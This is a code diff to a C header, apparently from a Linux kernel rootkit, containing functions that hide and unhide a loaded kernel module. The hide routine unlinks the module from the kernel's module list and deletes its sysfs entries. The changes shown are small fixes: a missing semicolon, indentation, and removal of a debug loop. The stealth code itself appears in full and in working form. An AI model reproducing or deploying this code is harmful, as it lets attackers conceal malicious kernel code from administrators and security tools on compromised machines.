@@ -1,6 +1,5 @@
 #ifndef KITE_HIDER
     #define KITE_HIDER
-    #define CONFIG_SYSFS
     #include <linux/sysfs.h>
 
 struct module_sect_attr {
@@ -38,11 +37,11 @@ static void show_mod(void) {
     THIS_MODULE->holders_dir = kobject_create_and_add("holders", &THIS_MODULE->mkobj.kobj);
     for (i=0;(THIS_MODULE->modinfo_attrs[i].attr.name) != NULL;i++){
 #ifdef KITE_DEBUG
-    pr_info("Creating %s\n", THIS_MODULE->modinfo_attrs[i].attr.name);
+        pr_info("Creating %s\n", THIS_MODULE->modinfo_attrs[i].attr.name);
 #endif  
-    if (sysfs_create_file(&THIS_MODULE->mkobj.kobj,&THIS_MODULE->modinfo_attrs[i].attr)!=0)
+        if (sysfs_create_file(&THIS_MODULE->mkobj.kobj,&THIS_MODULE->modinfo_attrs[i].attr)!=0)
 #ifdef KITE_DEBUG
-        pr_err("couldn't create %s\n", THIS_MODULE->modinfo_attrs[i].attr.name);
+            pr_err("couldn't create %s\n", THIS_MODULE->modinfo_attrs[i].attr.name);
 #endif
     }
     notes_attrs_prev->dir = kobject_create_and_add("notes", &THIS_MODULE->mkobj.kobj);
@@ -50,7 +49,7 @@ static void show_mod(void) {
         sysfs_create_bin_file(notes_attrs_prev->dir,
 					  &notes_attrs_prev->attrs[i]);
     }
-    sysfs_create_group(&THIS_MODULE->mkobj.kobj, &sect_attrs_prev->grp)
+    sysfs_create_group(&THIS_MODULE->mkobj.kobj, &sect_attrs_prev->grp);
     THIS_MODULE->notes_attrs = notes_attrs_prev;
     THIS_MODULE->sect_attrs = sect_attrs_prev;
     hidden = 0;
@@ -58,7 +57,6 @@ static void show_mod(void) {
 
 
 static void hide_mod(void) {
-    static int i;
     // keep the module that this module is attached to after in the modules linked list, to reattach later
     prev_module = THIS_MODULE->list.prev;
     // delete this module from the list by linking previous module to the next(thats behind the scenes)
@@ -70,9 +68,6 @@ static void hide_mod(void) {
     sect_attrs_prev = THIS_MODULE->sect_attrs;
     notes_attrs_prev = THIS_MODULE->notes_attrs;
 
-    for (i=0;(THIS_MODULE->modinfo_attrs[i].attr.name) != NULL;i++){
-        pr_info("%s\n", THIS_MODULE->modinfo_attrs[i].attr.name);
-    }
     kobject_del(&THIS_MODULE->mkobj.kobj);
     hidden = 1;
 }
